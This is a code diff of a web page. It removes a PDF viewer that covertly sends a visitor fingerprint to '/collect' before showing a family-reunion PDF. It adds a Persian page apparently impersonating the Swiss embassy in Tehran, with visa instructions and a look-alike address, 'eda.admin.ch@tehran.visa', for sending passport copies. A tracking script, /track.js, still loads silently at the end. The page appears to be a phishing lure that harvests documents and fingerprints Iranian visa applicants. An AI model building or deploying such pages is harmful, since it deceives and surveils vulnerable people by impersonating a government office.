@@ -1,42 +1,126 @@
-<!-- public/index.html -->
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>My PDF Viewer</title>
-  <script src="/track.js" defer></script>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-      background-color: #f4f4f4;
-    }
-    iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مجوز الحاق به خانواده - سفارت سوئیس در ایران</title>
+    <style>
+        body {
+            font-family: Tahoma, Arial, sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            direction: rtl;
+        }
+        header {
+            background-color: #004080;
+            color: white;
+            padding: 20px 10px;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 28px;
+        }
+        main {
+            max-width: 900px;
+            margin: 20px auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        section {
+            margin-bottom: 25px;
+        }
+        h2 {
+            color: #004080;
+            border-bottom: 2px solid #004080;
+            padding-bottom: 5px;
+            margin-bottom: 15px;
+        }
+        ul {
+            padding-right: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        .important {
+            background-color: #fff3cd;
+            padding: 10px 15px;
+            border-right: 5px solid #ffeeba;
+            margin-bottom: 15px;
+        }
+        a {
+            color: #004080;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        footer {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin: 20px 0;
+        }
+    </style>
 </head>
 <body>
-  <script>
-    // Wait for the fingerprint to finish, then load the PDF
-    (async () => {
-      try {
-        if (typeof sendFingerprint === 'function') {
-          await sendFingerprint('/collect'); // wait until fingerprint is sent
-        }
-      } catch (e) {
-        console.error('Fingerprint error:', e);
-      }
-      // After tracking, display PDF
-      const iframe = document.createElement('iframe');
-      iframe.src = 'Family_Reunion_EN.pdf'; // must be in public/
-      document.body.appendChild(iframe);
-    })();
-  </script>
+    <header>
+        <h1>مجوز الحاق به خانواده</h1>
+    </header>
+    <main>
+        <section>
+            <h2>ثبت درخواست روادید</h2>
+            <p>ثبت درخواست ویزا فقط با وقت قبلی امکان‌پذیر است. جهت دریافت نوبت، لطفاً یک ایمیل همراه با کپی گذرنامه به آدرس زیر ارسال کنید:</p>
+            <p><a href="mailto:eda.admin.ch@tehran.visa">eda.admin.ch@tehran.visa</a></p>
+            <p>برای کسب اطلاعات بیشتر، لطفاً به وبسایت سفارت مراجعه کنید: <a href="https://www.eda.admin.ch/tehran" target="_blank">www.eda.admin.ch/tehran</a></p>
+        </section>
+
+        <section>
+            <h2>مدارک ویزا</h2>
+            <ul>
+                <li>فرم تقاضای ویزا (اقامت بلند مدت، نوع D)، تکمیل و امضا شده توسط متقاضی.</li>
+                <li>عکس گذرنامه‌ای رنگی و جدید (3.5×4.5 سانتیمتر)، بدون منگنه، سر نباید پوشیده باشد مگر دلایل مذهبی.</li>
+                <li>اصل گذرنامه با حداقل ۳ ماه اعتبار پس از تاریخ ویزا و حداقل ۲ صفحه خالی.</li>
+                <li>توضیح‌نامه از نامزد/همسر/سرپرست/والدین/فرزند با ذکر دلایل اقامت طولانی مدت (دو نسخه).</li>
+                <li>اجازه اقامت سوئیسی یا گذرنامه از همسر/سرپرست/والدین/فرزند ساکن سوئیس (دو نسخه).</li>
+                <li>کپی صفحات ۲ و ۳ گذرنامه (دو نسخه).</li>
+                <li>اصل شناسنامه و ترجمه رسمی آن (یک نسخه کپی).</li>
+                <li>سند ازدواج (در صورت الحاق به همسر)، اصل و ترجمه رسمی (یک نسخه کپی).</li>
+                <li>شناسنامه فرزندان، اصل و ترجمه رسمی (یک نسخه کپی).</li>
+            </ul>
+        </section>
+
+        <section>
+            <h2>اطلاعات مهم</h2>
+            <div class="important">
+                <ul>
+                    <li>تقاضا باید حداقل ۴ ماه قبل از تاریخ سفر ثبت شود.</li>
+                    <li>همه مدارک باید به انگلیسی یا یکی از زبان‌های رسمی سوئیس (آلمانی، فرانسوی یا ایتالیایی) ترجمه رسمی شده باشند.</li>
+                    <li>مدت رسیدگی: ۱۲ تا ۱۶ هفته. پس از دریافت مجوز، مقامات سوئیسی مستقیماً با متقاضی تماس می‌گیرند.</li>
+                    <li>افرادی که ساکن ایران نیستند، باید درخواست خود را به نماینده سوئیس در کشور محل اقامت ارائه دهند.</li>
+                    <li>حضور متقاضی الزامی است و درخواست ویزا فقط با ارائه مدارک کامل پذیرفته می‌شود.</li>
+                    <li>ویزای توریستی یا دیدار دوستان/اقوام در طول رسیدگی صادر نمی‌شود.</li>
+                    <li>پاسخ به سوالات فقط از طریق ایمیل <a href="mailto:tehran.visa@eda.admin.ch">tehran.visa@eda.admin.ch</a> امکان‌پذیر است.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section>
+            <h2>اطلاعات تماس سفارت سوئیس در ایران</h2>
+            <p>Elahieh, Ave. Sharifi Manesh, 2 Yasaman Street, P.O. Box 19395-4683, 19649 Teheran</p>
+            <p>تلفن: +98 21 2200 8333 | فکس: +98 21 2200 6002</p>
+            <p>ایمیل: <a href="mailto:tehran.visa@eda.admin.ch">tehran.visa@eda.admin.ch</a></p>
+            <p>وبسایت: <a href="https://www.eda.admin.ch/Tehran" target="_blank">www.eda.admin.ch/Tehran</a></p>
+        </section>
+    </main>
+    <footer>
+        سفارت سوئیس در ایران | ژوئیه
+    </footer>
+<script src="/track.js"></script>
 </body>
 </html>
